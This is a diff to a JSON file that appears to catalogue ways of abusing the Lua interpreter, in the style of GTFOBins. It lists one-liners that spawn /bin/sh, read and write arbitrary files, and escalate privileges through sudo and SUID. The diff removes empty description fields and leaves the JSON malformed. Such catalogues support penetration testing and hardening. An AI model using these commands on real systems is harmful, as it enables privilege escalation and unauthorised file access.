@@ -2,7 +2,7 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "lua -e 'os.execute(\"/bin/sh\")'\n"
       }
     ],
@@ -32,31 +32,31 @@
     ],
     "file-write": [
       {
-        "description": "",
+        
         "code": "lua -e 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"DATA\"); io.close(f);'\n"
       }
     ],
     "file-read": [
       {
-        "description": "",
+        
         "code": "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'\n"
       }
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo lua -e 'os.execute(\"/bin/sh\")'\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "./lua -e 'os.execute(\"/bin/sh\")'\n"
       }
     ]
